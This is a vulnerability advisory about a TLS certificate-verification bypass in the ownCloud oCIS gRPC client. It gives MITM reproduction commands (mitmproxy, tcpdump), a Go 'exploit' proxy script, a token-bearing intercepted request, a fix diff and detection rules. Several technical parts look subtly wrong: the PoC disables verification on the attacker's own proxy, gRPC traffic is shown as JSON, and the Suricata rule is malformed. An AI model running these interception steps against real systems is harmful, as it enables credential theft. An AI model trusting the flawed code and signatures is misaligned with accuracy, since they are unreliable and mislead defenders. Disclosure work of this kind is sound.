# Vulnerability Report: TLS Certificate Verification Bypass in ownCloud oCIS gRPC Client**  
**CVE-ID:** Pending • **Affected Version:** oCIS < PR #11584 • **Risk:** High (CVSS: 8.1)  

---

## Vulnerability Overview 
**Type:** Improper Certificate Validation → Man-in-the-Middle (MITM) Attacks  
**CWE:** [CWE-295: Improper Certificate Validation](https://cwe.mitre.org/data/definitions/295.html)  
**Location:** [`ocis-pkg/service/grpc/client.go#L77-L80`](https://github.com/owncloud/ocis/blob/dff22670e8f61cd5bb9d8cc0bb3cf67e5f97e979/ocis-pkg/service/grpc/client.go#L77-L80)  
**Impact:**  
- Full decryption of gRPC communications  
- Service impersonation and credential theft  
- Data integrity violation  
- Compromise of microservice authentication  
- Potential privilege escalation in cloud environments  

---

## Vulnerability Flow
```mermaid
sequenceDiagram
    participant Client
    participant Attacker
    participant Server

    Client->>Attacker: Initiate TLS connection (with InsecureSkipVerify: true)
    Attacker->>Server: Forward connection (with MITM proxy)
    Server-->>Attacker: Server certificate
    Attacker-->>Client: Forged certificate (accepted unconditionally)
    Client->>Attacker: Sensitive data (authentication tokens, files)
    Attacker->>Server: Relay data after inspection
```


## Step-by-Step Technical Flow 
1. **Setup Environment:**  
   ```bash
   git clone https://github.com/owncloud/ocis
   cd ocis && git checkout dff2267
   make build
   ```

2. **Configure Vulnerable Client:**  
   ```yaml
   # config.yaml
   grpc:
     tls_mode: "insecure"  # Enables vulnerability
   ```

3. **Launch MITM Attack:**  
   ```bash
   # Start mitmproxy
   mitmproxy --mode reverse:https://target-server:9000 --ssl-insecure
   ```

4. **Intercept Communications:**  
   ```bash
   # Capture decrypted gRPC traffic
   tcpdump -i any -w ocis_grpc.pcap port 9000
   ```


## Comparative Analysis  
**Secure vs Insecure gRPC Implementations:**  
| Library/Framework  | Default Behavior       | Vulnerable Pattern          |
|--------------------|------------------------|-----------------------------|
| **gRPC-Go**        | Strict verification    | `InsecureSkipVerify: true`  |
| **oCIS (Vuln)**    | Configurable bypass    | TLSMode: "insecure"         |
| **Best Practice**  | Certificate pinning    | mTLS with identity checks   |

---

## Proof of Concept
**Exploit Script:** `ocis_mitm.go`  
```go
package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/http/httputil"
)

func main() {
	// MITM proxy targeting oCIS gRPC
	proxy := &httputil.ReverseProxy{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // Exploits vulnerability
			},
		},
		Director: func(req *http.Request) {
			req.URL.Scheme = "https"
			req.URL.Host = "target-ocis:9000"
			fmt.Printf("Intercepted: %s %s\n", req.Method, req.URL)
		},
	}

	http.ListenAndServe(":9000", proxy)
}
```

**Intercepted Data Sample:**  
```
POST /com.owncloud.api.SettingsService/GetSetting HTTP/1.1
Content-Type: application/grpc
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
User-Agent: grpc-go/1.54.0

{"key": "security.jwt.secret"}
```

## Technical Deep Dive**  
**Vulnerable Code:**  
```go
func NewClient(opts ...Option) (grpc.ClientConnInterface, error) {
	options := newOptions(opts...)
	var tlsConfig *tls.Config
	if options.TLSMode == "insecure" {
		tlsConfig = &tls.Config{
			InsecureSkipVerify: true, // VULNERABLE LINE
		}
	}
	// ... establishes connection with weak TLS
}
```

**Cryptographic Impact:**  
- Disables server identity verification (`ServerName` check)  
- Bypasses certificate chain validation  
- Accepts expired/revoked certificates  
- Permits mismatched hostnames  


---

**Official Fix:** [PR #11584](https://github.com/owncloud/ocis/pull/11584)  
```diff
func NewClient(opts ...Option) (grpc.ClientConnInterface, error) {
	options := newOptions(opts...)
-	if options.TLSMode == "insecure" {
-		tlsConfig = &tls.Config{
-			InsecureSkipVerify: true,
-		}
-	}
+	if options.TLSMode == "insecure" {
+		return nil, errors.New("insecure mode not allowed")
+	}
```

**Defense-in-Depth:**  
1. Certificate Pinning:  
```go
tlsConfig = &tls.Config{
	VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
		// Check against known fingerprint
	},
}
```

2. Service Mesh Integration:  
```yaml
# Istio PeerAuthentication
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: ocis-strict
spec:
  mtls:
    mode: STRICT
```


## Impact Expansion
**Attack Tree:**  
```mermaid
graph TD
A[Network Access] --> B[Redirect gRPC Traffic]
B --> C[Intercept with MITM]
C --> D[Steal JWT Tokens]
C --> E[Capture Admin Creds]
D --> F[Access User Data]
E --> G[Compromise Entire Cluster]
```

---

## Forensic Artifacts
**Detection Signatures:**  
**Suricata Rule:**  
```yaml
alert tls any any -> any any (
    msg: "oCIS Insecure gRPC Connection";
    tls_state: "client_hello";
    content: "insecure"; 
    metadata: service ocis;
    sid: 90011584;
    rev: 1;
)
```

**Log Indicators:**  
```log
WARN[2023-08-04T14:30:22Z] Using insecure TLS configuration grpc_service=client
```

**Network Forensics:**  
- TCP connections to port 9000 without ALPN negotiation  
- gRPC messages with `grpc-accept-insecure` header  


### **References**  
1. [PR #11584: Remove insecure TLS mode](https://github.com/owncloud/ocis/pull/11584)  
2. [CWE-295: Improper Certificate Validation](https://cwe.mitre.org/data/definitions/295.html)  
3. [OWASP Transport Layer Protection](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)  
4. [gRPC Security Best Practices](https://grpc.io/docs/guides/auth/)  
